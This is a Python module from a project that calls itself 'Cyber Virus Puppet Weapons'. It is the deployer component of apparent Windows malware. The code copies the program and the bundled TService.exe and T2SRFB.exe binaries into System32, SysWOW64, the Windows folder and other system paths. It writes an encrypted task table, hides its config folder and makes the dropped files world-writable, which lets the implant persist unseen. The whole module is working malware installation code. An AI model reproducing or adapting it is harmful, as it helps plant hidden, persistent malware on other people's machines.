# -*- Config : UTF-8 -*-
# Project Name: Termination Generally Use Cyber Virus Puppet Weapons - TLib/T_WSD
# Version: 4.2.0
# Build Version: ./TConfig/version.ini
# Author: Veyra
# Description:

# Create a directory under the operating system kernel and copy the compiler of
# This project to the directory file under the operating system kernel.
# If the kernel does not have permissions, it will try to copy from other directories.


from .T_imports import *
from .T_AdministratorMode import AdministratorMode
from .T_FIO import *
from .T_CDLL import *
from . import T_Log
from . import T_Std

# Basic Logic
# Ontology Program + Service Program ----> System32
# Config --------------------------------> Windows\{self.Name}
# Analyze The Specific Situation On A Case-By-Case Basis.
# According To Specific Strategies.


class WorkSpaceDeployer:
    def __init__(self, master: 'Termination4.Termination', Name: str) -> None:
        self.master: 'Termination4.Termination' = master
        self.Name: str = Name
        self.__init_values__()

    def __init_values__(self) -> None:
        self.L3TFile: str = "{\"LocalTimeTaskTable\":{}}"
        self.WinDir: str = os.getenv("windir") + "\\" or "C:\\Windows\\"
        self.SystemDrive: str = os.getenv("SystemDrive") + "\\" or "C:\\"
        self.System32: str = os.path.join(self.WinDir, "System32")
        self.Temp: str = os.getenv("temp") + "\\"

        self.__NeedMainPaths__: list[str] = [
            os.path.join(self.SystemDrive, "Windows", "Termination"),
            os.path.join(self.SystemDrive, "Windows", "System32"),
            os.path.join(self.SystemDrive, "Windows", "SysWOW64"),
            os.path.join(self.WinDir, self.Name),
            os.path.join(self.SystemDrive, "ProgramData", self.Name),
            os.path.join(self.SystemDrive, "Program Files", self.Name),
            os.path.join(self.SystemDrive, "Program Files (x86)", self.Name),
            os.path.join(self.SystemDrive, self.Name),
            os.path.join(self.Temp, self.RandomTempName()),
        ]

        self.__NeedConfigPaths__: list[str] = [
            os.path.join(self.WinDir, self.Name),
            os.path.join(self.SystemDrive, "ProgramData", self.Name),
            os.path.join(self.SystemDrive, "Program Files", self.Name),
            os.path.join(self.SystemDrive, "Program Files (x86)", self.Name),
            os.path.join(self.SystemDrive, self.Name),
            os.path.join(self.Temp, self.RandomTempName()),
        ]

        self.logger: T_Log.Logger = T_Log.LoggerChild(self.master.Log, "WSD")

    def __init_work_dir_values__(self) -> None:
        self.__NeedMainPath__: str   = self.SelectBestPath(self.__NeedMainPaths__, self.__NeedMainPaths__[-1])
        self.__NeedConfigPath__: str = self.SelectBestPath(self.__NeedConfigPaths__, self.__NeedConfigPaths__[-1])
        self.__NeedFile__: str       = os.path.join(self.__NeedMainPath__, f"TRuntimes.{self.master.WorkMod}")
        self.__NeedTService__: str   = os.path.join(self.__NeedMainPath__, "TService.exe")
        self.__NeedT2SRFB__: str     = os.path.join(self.__NeedMainPath__, "T2SRFB.exe")
        self.__NeedL3T__: str        = os.path.join(self.__NeedConfigPath__, "L3T.GKBD")
        self.__NeedDISC__: str       = os.path.join(self.__NeedConfigPath__, "Termination.DISC")
        self.logger.Info(f"NeedFile: {self.__NeedFile__}")
    
    def RandomTempName(self, Prefix: str = "TCD", Suffix: str = ".tmp", Rules: str = string.ascii_uppercase + string.digits, Length: int = 5):
        return f"{Prefix}{''.join(random.choices(Rules, k = Length))}{Suffix}"

    def Is_NeedWorkPath(self) -> bool:
        return os.path.abspath(self.master.__work_path__).lower() in [os.path.abspath(p).lower() for p in self.__NeedMainPaths__]

    def Copy(self) -> bool:
        if self.Is_NeedWorkPath(): return True
        try:
            self.__PathLib_NeedMainPath__ = pathlib.Path(self.__NeedMainPath__)
            self.__PathLib_NeedMainPath__.mkdir(parents = True, exist_ok = True)
            self.__PathLib_NeedConfigPath__ = pathlib.Path(self.__NeedConfigPath__)
            self.__PathLib_NeedConfigPath__.mkdir(parents = True, exist_ok = True)
            self.logger.Success(f"Using Path: [{self.__NeedMainPath__}]")
        except Exception as e:
            self.logger.Error(T_Std.ErrorFormat(e, f"Failed To Create Folder: [{self.__NeedMainPath__}]"))
            return False
        try: FIO.HideFile(self.__NeedConfigPath__)
        except:
            self.logger.Error(T_Std.ErrorFormat(e, f"Failed To Hiding Folder: [{self.__NeedConfigPath__}]"))
            return False
        return self.WriteFiles()

    def WriteFiles(self) -> bool:
        try:
            if not self.IsSameFile(self.master.__file__, self.__NeedFile__):
                FIO.openw(self.__NeedFile__, self.master.__file_bytes__ if hasattr(self.master, '__file_bytes__') else FIO.openr(self.master.__file__, 2), 2)
            if not os.path.isfile(self.__NeedTService__):
                FIO.openw(self.__NeedTService__, FIO.openr(self.master.PEBinary_Service, 2), 2)
            if not os.path.isfile(self.__NeedT2SRFB__):
                FIO.openw(self.__NeedT2SRFB__, FIO.openr(self.master.PEBinary_T2SRFB, 2), 2)
            if not os.path.isfile(self.__NeedL3T__):
                FIO.openw(self.__NeedL3T__, self.master.GodKeys.encrypt(self.L3TFile), 2)
            if not os.path.isfile(self.__NeedDISC__):
                FIO.openw(self.__NeedDISC__, FIO.openr(self.master.Static_TerminationDISC, 2), 2)
            for File in [self.__NeedFile__, self.__NeedTService__, self.__NeedT2SRFB__, self.__NeedL3T__, self.__NeedDISC__]:
                if os.path.exists(File):
                    os.chmod(File, 0o777)
            self.logger.Success("Files Copied Successfully")
            return True
        except Exception as e:
            self.logger.Error(T_Std.ErrorFormat(e, "File Operation Failed"))
            return False
    def IsSameFile(self, Path1: str, Path2: str) -> bool:
        return pathlib.Path(Path1).resolve() == pathlib.Path(Path2).resolve()
    def __CheckPathPermission(self, Path: str) -> int:
        if os.path.exists(Path):
            if os.access(Path, os.R_OK | os.W_OK): return 2
            else: return 0
        else:
            ParentDir: str = os.path.dirname(Path)
            if os.path.exists(ParentDir) and os.access(ParentDir, os.W_OK): return 1
            else: return 0
    def SelectBestPath(self, PathList: list[str], NoWayPath: str | None = None) -> str | None:
        Categorized = {0: [], 1: [], 2: []}
        for Path in PathList:
            Status: int = self.__CheckPathPermission(Path)
            Categorized[Status].append(Path)
        if Categorized[2]: return Categorized[2][0]
        elif Categorized[1]: return Categorized[1][0]
        elif PathList:
            for Path in PathList:
                if self.__CheckPathPermission(Path) > 0: return Path
        return PathList[0] if PathList else NoWayPath


class ResourcesManager:
    def __init__(self, master: 'Termination4.Termination') -> None:
        self.master: 'Termination4.Termination' = master
    @property
    def ResourcePath(self) -> None:
        if self.master.WorkMod == "py": return "."
        return self.master.__static_path__
    def GetResourceFile(self, *Name: str):
        if len(Name) >= 1 and isinstance(Name[0], list):
            if self.master.WorkMod != "py" and len(Name) >= 2 and isinstance(Name[1], list): NameParts = Name[0]
            else: NameParts = Name[1]
            return os.path.join(self.ResourcePath, *NameParts)
        else: return os.path.join(self.ResourcePath, *Name)
